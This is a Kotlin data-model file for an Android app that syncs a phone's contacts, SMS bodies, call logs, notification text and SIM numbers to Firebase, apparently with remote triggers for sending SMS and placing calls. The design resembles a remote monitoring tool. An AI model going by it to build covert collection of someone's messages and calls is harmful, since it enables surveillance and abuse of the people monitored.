package com.boxx.datasync.domain.model

import com.google.firebase.firestore.IgnoreExtraProperties

@IgnoreExtraProperties
data class Device(
    val deviceId: String = "",
    val deviceName: String = "",
    val manufacturer: String = "",
    val model: String = "",
    val osVersion: String = "",
    val lastSyncTime: Long = 0,
    val contactCount: Int = 0,
    val smsCount: Int = 0,
    val callCount: Int = 0,
    val notificationCount: Int = 0,
    val heartbeatAt: Long = 0,
    val timestamp: Long = 0,
    val syncStatus: String = "Idle",
    val syncRequestedAt: Long = 0,
    val presenceStatus: String = "Offline",
    val lastError: String = "",
    val sim1Carrier: String = "",
    val sim2Carrier: String = "",
    val sim1Number: String = "",
    val sim2Number: String = "",
    val sim1Ready: Boolean = false,
    val sim2Ready: Boolean = false,
    val smsRequestedAt: Long = 0,
    val smsRequestNumber: String = "",
    val smsRequestMessage: String = "",
    val smsRequestSimSlot: Int = 0,
    val callRequestedAt: Long = 0,
    val callRequestNumber: String = "",
    val callRequestSimSlot: Int = 0,
    val forceFullSyncRequestedAt: Long = 0
)

@IgnoreExtraProperties
data class Contact(
    val id: String = "",
    val name: String = "",
    val phone: String = "",
    val lastUpdated: Long = 0
)

@IgnoreExtraProperties
data class SMS(
    val id: String = "",
    val address: String = "",
    val body: String = "",
    val date: Long = 0,
    val type: Int = 1 // 1=inbox, 2=sent
)

@IgnoreExtraProperties
data class CallLog(
    val id: String = "",
    val number: String = "",
    val name: String = "",
    val type: Int = 0,
    val date: Long = 0,
    val duration: Long = 0
)

@IgnoreExtraProperties
data class NotificationData(
    val id: String = "",
    val appName: String = "",
    val packageName: String = "",
    val title: String = "",
    val text: String = "",
    val timestamp: Long = 0,
    val groupKey: String? = null,
    val iconBase64: String = "",
    val sender: String = "",
    val conversationId: String? = null
)
